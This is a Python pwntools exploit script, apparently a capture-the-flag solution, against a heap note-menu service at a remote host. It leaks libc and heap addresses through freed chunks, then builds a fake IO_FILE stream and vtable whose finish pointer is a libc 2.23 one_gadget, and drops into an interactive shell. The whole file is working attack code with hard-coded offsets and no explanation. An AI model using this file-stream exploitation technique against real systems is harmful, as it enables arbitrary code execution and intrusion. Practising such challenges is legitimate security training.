from pwn import *
from IO_FILE import *

###Util
def create(size,data):
    r.sendlineafter('choice?\n','1')
    r.sendlineafter('want?\n',str(size))
    if size>0 and size<=0x68:
        r.sendafter('Content: ',data)

def delete(idx):
    r.sendlineafter('choice?\n','2')
    r.sendlineafter('delete?\n',str(idx))

def edit(idx,data):
    r.sendlineafter('choice?\n','3')
    r.sendlineafter('modify?\n',str(idx))
    r.sendafter('input?\n',data)

def show(idx):
    r.sendlineafter('choice?\n','4')
    r.sendlineafter('see?\n',str(idx))
    return r.recvuntil('\n1. add',drop=True).split(b' : ')[-1].split(b'\n')[0]

def readflag():
    r.sendlineafter('choice?\n','5')

def showflag():
    r.sendlineafter('choice?\n','6')
    return r.recvuntil('\n1. add',drop=True).split(b'\n')[-1]

###Addr
#  libc2.23
main_arena_offset = 0x3c4b20
small_bin_offset = main_arena_offset+0x178
one_gadget = 0xf1147

###Exploit
r = remote('nc.eonew.cn',10006)

for i in range(12):
    create(0x68,'M30W')
for i in range(11,-1,-1):
    delete(i)
readflag()
create(0,'')
small_bin_addr = u64(show(0)+b'\x00\x00')
libc_base = small_bin_addr-small_bin_offset
print(hex(libc_base))

create(0x68,'M30W')
delete(1)
delete(0)
create(0,'')
heap_addr = u64(show(0).ljust(8,b'\x00'))-0x480
print(hex(heap_addr))

showflag()

IO_file = IO_FILE_plus(arch=64)
stream = IO_file.construct(flags = 0xfbad000,
                           vtable_offset = 0,
                           vtable = heap_addr+0x490)

IO_jump = IO_jump_t(arch=64)
vtable = IO_jump.construct(finish = libc_base+one_gadget)

create(0x68,vtable[:0x67])
create(0x68,b'\x00'*0x50+stream[:0x17])
create(0x68,stream[0x20:0x87])
create(0x68,stream[0x90:])

showflag()

r.interactive()
